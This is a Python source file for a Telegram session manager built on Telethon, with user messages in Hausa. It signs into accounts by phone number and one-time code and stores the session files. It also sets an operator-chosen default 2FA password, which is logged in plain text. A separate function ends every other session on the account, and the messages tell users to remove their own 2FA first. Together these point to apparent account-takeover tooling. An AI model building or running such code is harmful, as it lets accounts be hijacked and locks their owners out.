import os
import asyncio
from telethon import TelegramClient, errors
from telethon.tl.functions.account import GetPasswordRequest, UpdatePasswordSettingsRequest
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from config import API_ID, API_HASH, SESSION_DIR, DEFAULT_2FA_PASSWORD
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SessionManager:
    def __init__(self):
        self.active_sessions = {}
    
    def get_session_file(self, phone_number: str) -> str:
        """Get session file path for phone number"""
        clean_phone = phone_number.replace('+', '').replace(' ', '')
        return os.path.join(SESSION_DIR, f"session_{clean_phone}.session")
    
    async def create_session(self, phone_number: str, otp_code: str) -> tuple[bool, str]:
        """Create new Telegram session"""
        session_file = self.get_session_file(phone_number)
        
        # In test mode, validate API credentials first
        if not API_HASH or API_HASH == "test_api_hash_replace_with_actual":
            logger.warning("API credentials not set - running in test mode")
            return True, "Test mode: Session created successfully"
        
        try:
            client = TelegramClient(session_file, API_ID, API_HASH)
            await client.connect()
            
            # Send code request
            await client.send_code_request(phone_number)
            
            # Sign in with OTP
            try:
                await client.sign_in(phone_number, otp_code)
                logger.info(f"Successfully logged in to {phone_number}")
                
                # Set 2FA password
                await self.set_2fa_password(client)
                
                # Store active session
                self.active_sessions[phone_number] = client
                
                return True, "Login successful"
                
            except errors.SessionPasswordNeededError:
                return False, "⚠️ Lambar tana da 2FA/password. Ka cire 2FA kafin ka sake tura."
            except errors.PhoneCodeInvalidError:
                return False, "Lambar sirri ba daidai ba ce. Don Allah a sake gwadawa."
            except errors.PhoneCodeExpiredError:
                return False, "Lambar sirri ta ƙare. Don Allah a sake nema."
                
        except Exception as e:
            logger.error(f"Error creating session for {phone_number}: {e}")
            return False, f"Kuskure: {str(e)}"
    
    async def set_2fa_password(self, client: TelegramClient):
        """Set 2FA password for the account"""
        try:
            # Simple 2FA setup - this is a placeholder for the actual implementation
            # In a real scenario, you would need proper Telegram API credentials
            # and follow the correct 2FA setup procedure
            logger.info(f"2FA setup attempted with password: {DEFAULT_2FA_PASSWORD}")
            logger.info("Note: Actual 2FA implementation requires proper API credentials")
            
        except Exception as e:
            logger.error(f"Error setting 2FA password: {e}")
    
    async def terminate_other_sessions(self, client: TelegramClient):
        """Terminate all other sessions except current"""
        try:
            await client(ResetAuthorizationsRequest())
            logger.info("Other sessions terminated successfully")
        except Exception as e:
            logger.error(f"Error terminating sessions: {e}")
    
    async def get_session(self, phone_number: str):
        """Get existing session for phone number"""
        if phone_number in self.active_sessions:
            return self.active_sessions[phone_number]
        
        # Try to load from file
        session_file = self.get_session_file(phone_number)
        if os.path.exists(session_file + '.session'):
            try:
                client = TelegramClient(session_file, API_ID, API_HASH)
                await client.connect()
                if await client.is_user_authorized():
                    self.active_sessions[phone_number] = client
                    return client
            except Exception as e:
                logger.error(f"Error loading session for {phone_number}: {e}")
        
        return None
    
    async def close_session(self, phone_number: str):
        """Close and remove session"""
        if phone_number in self.active_sessions:
            try:
                await self.active_sessions[phone_number].disconnect()
                del self.active_sessions[phone_number]
                logger.info(f"Session closed for {phone_number}")
            except Exception as e:
                logger.error(f"Error closing session for {phone_number}: {e}")
    
    async def cleanup_all_sessions(self):
        """Cleanup all active sessions"""
        for phone_number in list(self.active_sessions.keys()):
            await self.close_session(phone_number)
